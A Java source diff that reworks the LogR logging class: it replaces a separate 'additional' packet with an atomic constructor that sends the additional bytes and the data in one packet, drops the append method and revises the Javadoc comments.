@@ -28,8 +28,8 @@ public class LogR {
 	/** The Constant LOG_CREATE. */
 	final public static int LOG_CREATE = 0x1;
 	
-	/** The Constant LOG_ADDITIONAL. */
-	final public static int LOG_ADDITIONAL = 0x2;
+	/** The Constant LOG_ATOMIC. */
+	final public static int LOG_ATOMIC = 0x2;
 	
 	/** The Constant LOG_APPEND. */
 	final public static int LOG_APPEND = 0x3;
@@ -59,7 +59,7 @@ public class LogR {
 	final public static int LOG_PRI_MIN = 0xff;
 
 	/**
-	 * Instantiates a new log r.
+	 * Instantiates a new log, creates the evidence.
 	 *
 	 * @param logType the log type
 	 * @param priority the priority
@@ -79,7 +79,7 @@ public class LogR {
 	}
 
 	/**
-	 * Instantiates a new log r.
+	 * Instantiates a new log, creates the evidence with additional.
 	 *
 	 * @param logType the log type
 	 * @param priority the priority
@@ -95,14 +95,32 @@ public class LogR {
 		p.setType(type);
 		p.setPriority(priority);
 		p.setCommand(LOG_CREATE);
+		p.setAdditional(additional);
 
 		send(p);
+	}
+	
+	/**
+	 * Instantiates a new log, creates atomically the evidence with additional and data.
+	 *
+	 * @param logType the log type
+	 * @param priority the priority
+	 * @param additional the additional
+	 */
+	public LogR(final int logType, final int priority, final byte[] additional, final byte[] data) {
+		unique = Utils.getUniqueId();
+		disp = LogDispatcher.self();
+		type = logType;
 
-		final Packet add = new Packet(unique);
-		add.setCommand(LOG_ADDITIONAL);
-		add.fill(additional);
+		final Packet p = new Packet(unique);
 
-		send(add);
+		p.setType(type);
+		p.setPriority(priority);
+		p.setCommand(LOG_ATOMIC);
+		p.setAdditional(additional);
+		p.fill(data);
+
+		send(p);
 	}
 
 	// Send data to dispatcher
@@ -124,7 +142,7 @@ public class LogR {
 	}
 
 	/**
-	 * Write.
+	 * Write or append data to the log.
 	 *
 	 * @param data the data
 	 */
@@ -154,20 +172,6 @@ public class LogR {
 		return;
 	}
 
-	/**
-	 * Append.
-	 *
-	 * @param data the data
-	 */
-	public void append(final byte[] data) {
-		final Packet p = new Packet(unique);
-
-		p.setCommand(LOG_APPEND);
-		p.fill(data);
-
-		send(p);
-		return;
-	}
 
 	/**
 	 * Close.
